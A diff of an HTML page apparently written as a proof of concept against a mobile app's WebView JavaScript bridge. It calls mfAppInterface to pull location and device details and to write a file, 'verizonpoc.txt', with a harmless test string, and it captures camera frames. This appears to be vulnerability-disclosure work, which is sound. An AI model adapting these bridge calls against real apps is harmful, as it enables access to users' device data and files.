@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebView Listener Example</title>
+  <title>PoC</title>
   <style>
     #output {
     word-wrap: break-word;       
@@ -13,10 +13,13 @@
   </style>
 </head>
 <body>
-<h1>WebView JS Listener</h1>
+<h1>PoC</h1>
   
   <button onclick="handleButton1()">Location</button>
 <button onclick="handleButton2()">Device Info</button>
+  <button onclick="handleButton3()">File Download</button>
+  <div id="output"></div>
+  
  <video id="video" autoplay playsinline style="width: 300px;"></video>
 <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
@@ -24,7 +27,6 @@
 
 <img id="capturedImage" style="width:300px; margin-top:10px;" />
 
-<div id="output"></div>
 
 <script>
 
@@ -38,6 +40,14 @@
 
 function handleButton2() {
     window.mfAppInterface.postMessage(JSON.stringify({actionType:"deviceDetails"}));
+}
+
+  function handleButton3() {
+    window.mfAppInterface.postMessage(JSON.stringify({actionType: "downloadFile", byteData: "cG8gYyB3b3JrZWQ=",
+                fileName: "verizonpoc.txt",
+                mimeType: "txt",
+                fileType: "document",
+                type: "Save"}));
 }
   
 function getNativeInfo(data) {
@@ -56,27 +66,23 @@ navigator.mediaDevices.getUserMedia({ video: true })
       const ctx = canvas.getContext("2d");
       const capturedImage = document.getElementById("capturedImage");
 
-      // When button is clicked
+
       document.getElementById("snap").addEventListener("click", () => {
-        // Draw current video frame to canvas
+
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Convert canvas to image URL
+
         const dataUrl = canvas.toDataURL("image/png");
 
-        // Show the image
+
         capturedImage.src = dataUrl;
 
-        // Stop camera after capture
         stream.getTracks().forEach(track => track.stop());
       });
     })
     .catch((err) => {
       console.error("Camera error:", err);
-    });
-
-
- 
+    }); 
 </script>
 
 <div id="output"></div>
